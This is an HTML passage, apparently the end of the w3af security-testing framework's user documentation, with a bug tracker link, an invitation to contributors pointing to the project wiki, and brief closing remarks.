<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-top: 0.17in"><A HREF="http://sourceforge.net/tracker/?group_id=170274&amp;atid=853652">https://sourceforge.net/apps/trac/w3af/newticket</A></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-top: 0.17in"><BR><BR>
</P>
<H2 CLASS="western" ALIGN=JUSTIFY>Contributors</H2>
<P ALIGN=JUSTIFY>Code contributions <B>are always welcome</B>, a
plugin developer guide will be written shortly to aid new developers
enter the w3af world. For now, the best place to start is w3af's
Trac:</P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><A HREF="http://sourceforge.net/pm/?group_id=170274">https://sourceforge.net/apps/trac/w3af/wiki</A></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<H2 CLASS="western"></H2>
<H2 CLASS="western">Final words</H2>
<P><BR><BR>
</P>
<P ALIGN=JUSTIFY>This document is merely an introduction, complete
knowledge about the framework and its usage is complex and can be
achieved only by using it.</P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY>Making a mistake and learning from it takes you one
step closer to wisdom.</P>
</BODY>
</HTML>